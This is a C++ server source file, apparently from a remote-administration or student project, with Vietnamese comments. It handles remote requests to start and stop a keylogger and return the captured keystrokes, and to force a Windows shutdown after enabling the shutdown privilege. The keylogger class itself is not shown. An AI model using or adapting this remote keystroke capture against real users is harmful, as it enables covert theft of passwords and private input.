#include "Server.h"

#include "KeyLogger.h"

bool Server::keylog(Request& request, Response &response) {
    static KeyLogger keylog;

    string subaction = request.getParam(kSubAction);
    response.putParam(kStatus, "Ok");
    
    if (subaction == "Start") {
        cout << "Started keylogger\n";
        keylog.startKeylogger(); 
    } else if (subaction == "Stop") {
        cout << "Stopped keylogger\n";
        keylog.stopKeylogger();

        ifstream fin = keylog.getLoggingStream();
        string content; 
        string buf;
        while (getline(fin, buf)) {
            content += buf + "\n"; 
        }
        fin.close();
    
        response.putParam(kBody, content);
    }  

    return true;
}

void Server::shutdownSystem(){
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    // Lấy token cho tiến trình hiện tại
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)){
        return;
    }
    // Lấy LUID cho đặc quyền shutdown
    LookupPrivilegeValue(nullptr, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1; // one privillege to set;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    // Kích hoạt đặc quyền shutdown cho tiến trình
    AdjustTokenPrivileges(hToken, false, &tkp, 0, (PTOKEN_PRIVILEGES)nullptr, 0);
    if (GetLastError() != ERROR_SUCCESS)
        return;
    
    // Tắt hệ thống, buộc đóng tất cả ứng dụng
    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER)){
        std::cout << "Shutdown failed: Error: " << GetLastError() << "\n";
    }
    std::cout << "System is shutting down.....\n";
}
bool Server::processRequest(Request& request, Response &response) {
    cout << "Processing Request\n" << request << "\n";
    response.setAction(request.getAction());
    response.getParams().clear();
    
    switch (request.getAction()) {
        case ACTION_KEYLOG:
            return keylog(request, response);
        case ACTION_SHUTDOWN:
            shutdownSystem();
            response.putParam("Status", "Success");
            response.putParam("Body", "System is shutting down.\n");
            return true;
        default:
            return false;
    }
}